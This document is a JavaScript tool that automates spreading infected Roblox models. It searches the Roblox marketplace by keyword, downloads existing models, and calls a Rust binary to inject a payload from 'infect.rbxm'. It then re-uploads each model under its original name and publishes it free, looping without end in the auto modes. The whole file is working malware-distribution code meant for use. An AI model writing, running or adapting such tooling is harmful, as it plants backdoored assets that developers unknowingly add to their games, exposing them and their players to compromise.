import axios from "axios";
import fs from "fs";
import fsPromises from "fs/promises";
import path from "path";
import inquirer from "inquirer";
import {
    spawn
} from "child_process";

const basefile = "infect.rbxm",
    tempfile = "temp.model",
    outdir = "output",
    outnm = "inj.rbxm",
    binpath = "./target/debug/poop",
    stats = {
        errors: 0,
        uploaded: 0
    };

let tkncsrf = null;

function showFinalStats() {
    console.log("\n\n=== FINAL STATS ===");
    console.log(`[+] Successfully Uploaded: ${stats.uploaded}`);
    console.log(`[-] Total Errors:          ${stats.errors}`);
    console.log("===================\n");
}

process.on("SIGINT", () => {
    console.log("\n[INFO] Script interrupted by user.");
    showFinalStats();
    process.exit(0);
});

async function getcsrf(e) {
    try {
        await axios.post("https://auth.roblox.com/v2/logout", {}, {
            headers: {
                Cookie: `.ROBLOSECURITY=${e}`
            }
        })
    } catch (e) {
        if (e.response && e.response.headers["x-csrf-token"]) return tkncsrf = e.response.headers["x-csrf-token"], tkncsrf;
        console.log("[ERROR] Could not fetch csrf token:", e.message)
    }
    return null
}

async function initialsess(e) {
    try {
        const o = (await axios.get("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                Cookie: `.ROBLOSECURITY=${e}`
            }
        })).data;
        return console.log(`[SUCCESS] Logged in as: ${o.name} (ID: ${o.id})`), await getcsrf(e), !0
    } catch (e) {
        return console.log("[ERROR] Failed to initialize session:", e.message), !1
    }
}

async function downmdl(e, o) {
    try {
        const t = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(e)}&limit=${o}`;
        return (await axios.get(t)).data
    } catch (e) {
        return stats.errors++, console.log("[ERROR] Failed to search models: ", e.message), null
    }
}

async function downmdl2(e, o) {
    try {
        const t = await axios.get(`https://assetdelivery.roblox.com/v1/asset/?id=${e}`, {
            responseType: "arraybuffer",
            headers: {
                Cookie: `.ROBLOSECURITY=${o}`,
                "User-Agent": "Roblox/WinInet",
                "Content-Type": "application/json"
            }
        });
        return Buffer.from(t.data)
    } catch (o) {
        return stats.errors++, console.log(`[ERROR] Failed to download model ${e}:`, o.message), null
    }
}

async function publish(e, o) {
    try {
        return tkncsrf || await getcsrf(o), await axios.patch(`https://apis.roblox.com/user/cloud/v2/creator-store-products/PRODUCT_NAMESPACE_CREATOR_MARKETPLACE_ASSET-PRODUCT_TYPE_MODEL-${e}?allowMissing=true`, {
            basePrice: {
                currencyCode: "USD",
                quantity: {
                    significand: 0,
                    exponent: 0
                }
            },
            published: !0,
            modelAssetId: e.toString()
        }, {
            headers: {
                Cookie: `.ROBLOSECURITY=${o}`,
                "Content-Type": "application/json",
                "X-CSRF-TOKEN": tkncsrf
            }
        }), console.log(`[SUCCESS] Made model ${e} public`), !0
    } catch (t) {
        return t.response && 403 === t.response.status && (console.log("Refreshing..."), await getcsrf(o)), console.log(`[ERROR] Failed to make model ${e} public:`, t.response ? t.response.data : t.message), !1
    }
}

async function upraw(e, o, t, s) {
    try {
        tkncsrf || await getcsrf(s);
        const n = `https://data.roblox.com/Data/Upload.ashx?assetId=0&type=Model&name=${encodeURIComponent(o)}&description=${encodeURIComponent(t)}&isPublic=false&allowComments=true`;
        return (await axios.post(n, e, {
            headers: {
                Cookie: `.ROBLOSECURITY=${s}`,
                "X-CSRF-TOKEN": tkncsrf,
                "Content-Type": "application/octet-stream",
                "User-Agent": "Roblox/WinInet"
            }
        })).data
    } catch (e) {
        return console.log("[ERROR] Raw upload failed:", e.message), e.response && console.log("Details:", e.response.data), null
    }
}

async function pubh(e, o, t, s) {
    try {
        const n = fs.readFileSync(e),
            a = await upraw(n, o, t, s);
        return a ? (await new Promise((e => setTimeout(e, 2e3))), await publish(a, s), stats.uploaded++, console.log(`[SUCCESS] Uploaded <${a}>`), fs.rmSync(e), a) : null
    } catch (e) {
        stats.errors++;
        return console.log("[ERROR] Failed to upload/publish sequence:", e.message), null
    }
}

async function inj(e, o, t) {
    return new Promise(((s, n) => {
        const a = spawn(binpath, ["--target", e, "--base", o, "--output", t]);
        a.stderr.on("data", (e => {})), a.on("close", (e => {
            0 === e ? s(!0) : n(new Error(`Rust process exited with code ${e}`))
        }))
    }))
}

async function pword(query, count, cookie) {
    console.log(`\n[INFO] Fetching ${count} models for query "${query}"...`);
    const a = await downmdl(query, count);
    if (!a || !a.data || 0 === a.data.length) {
        console.log("[ERROR] No results found.");
        return;
    }
    const r = a.data.slice(0, count);
    for (const o of r) {
        const t = o.id,
            s = o.name || o.Name || "Unknown";
        console.log(`\n--- Processing: ${s} (${t}) ---`);
        try {
            console.log(`[INFO] Downloading ${t}...`);
            const dl = await downmdl2(t, cookie);
            if (!dl) continue;
            await fsPromises.writeFile(tempfile, dl);
            const n = path.join(outdir, outnm);
            console.log("[INFO] Injecting payload...");
            await inj(tempfile, basefile, n);
            console.log(`[SUCCESS] Injected into ${t} "${s}"`);
            await pubh(n, s, "Best model", cookie);
            try {
                await fsPromises.unlink(tempfile)
            } catch {}
        } catch (e) {
            stats.errors++;
            console.log(`[ERROR] Skipping ${t} due to error: ${e.message}`)
        }
        await new Promise((e => setTimeout(e, 1e3)))
    }
}

async function main() {
    try {
        await fsPromises.access(binpath)
    } catch {
        return console.error(`Error: binary not found at '${binpath}'.`), void console.error("Run 'cargo build'")
    }
    try {
        await fsPromises.access(basefile)
    } catch {
        return void console.log(`Warning: '${basefile}' not found.`)
    }

    const cookie = (await inquirer.prompt([{
        type: "input",
        name: "cookie",
        message: "Enter your .ROBLOSECURITY cookie:",
        validate: e => "" !== e.trim() || "Required"
    }])).cookie.trim();

    if (!await initialsess(cookie)) return;
    await fsPromises.mkdir(outdir, { recursive: !0 });

    const modeSel = await inquirer.prompt([{
        type: "list",
        name: "mode",
        message: "Select Mode:",
        choices: [
            { name: "A: Auto (Random keyword from keyword.txt)", value: "A" },
            { name: "Y: Auto (Single keyword loop)", value: "Y" },
            { name: "N: Manual", value: "N" }
        ]
    }]);

    if (modeSel.mode === "A") {
        let keywords = [];
        try {
            const data = await fsPromises.readFile("keyword.txt", "utf-8");
            keywords = data.split(/\r?\n/).map(k => k.trim()).filter(k => k.length > 0);
            if (keywords.length === 0) throw new Error("Empty file");
        } catch (e) {
            return console.log("[ERROR] Could not read 'keyword.txt' or it is empty.");
        }

        const autocnt = await inquirer.prompt([{
            type: "number",
            name: "count",
            message: "How many models to download per keyword?",
            default: 1,
            validate: e => !!(Number.isInteger(e) && e > 0) || "should be positive"
        }]);

        console.log(`[INFO] Mode A started. ${keywords.length} keywords loaded.`);
        console.log("[INFO] Press Ctrl+C to stop and view stats.");

        while (true) {
            const rndmkey = keywords[Math.floor(Math.random() * keywords.length)];
            console.log(`\n--- [MODE A] Random Keyword: "${rndmkey}" ---`);
            await pword(rndmkey, autocnt.count, cookie);
            console.log("\n[AUTO] Sleeping for 2 seconds...");
            await new Promise(r => setTimeout(r, 2000));
        }
    }

    else if (modeSel.mode === "Y") {
        const t = await inquirer.prompt([{
            type: "input",
            name: "query",
            message: "Enter the keyword to loop:",
            validate: e => "" !== e.trim() || "Required"
        }, {
            type: "number",
            name: "count",
            message: "How many models to download per cycle?",
            default: 1,
            validate: e => !!(Number.isInteger(e) && e > 0) || "should be positive"
        }]);

        console.log(`[INFO] Mode Y started. Looping keyword: "${t.query}"`);
        console.log("[INFO] Press Ctrl+C to stop and view stats.");

        while (true) {
            console.log(`\n--- [MODE Y] Looping: "${t.query}" ---`);
            await pword(t.query.trim(), t.count, cookie);
            console.log("\n[AUTO] Sleeping for 2 seconds...");
            await new Promise(r => setTimeout(r, 2000));
        }
    } 
    

    else {
        let running = true;
        while (running) {
            console.log("\n--- [MODE N] Manual Task ---");
            const t = await inquirer.prompt([{
                    type: "input",
                    name: "query",
                    message: "Enter search query:",
                    validate: e => "" !== e.trim() || "Required"
                }, {
                    type: "number",
                    name: "count",
                    message: "How many models to download & upload?",
                    default: 1,
                    validate: e => !!(Number.isInteger(e) && e > 0) || "should be positive"
                }]);
            
            await pword(t.query.trim(), t.count, cookie);

            running = (await inquirer.prompt([{
                type: "confirm",
                name: "again",
                message: "Run another manual task?",
                default: !0
            }])).again;
        }
        showFinalStats();
    }
}

main();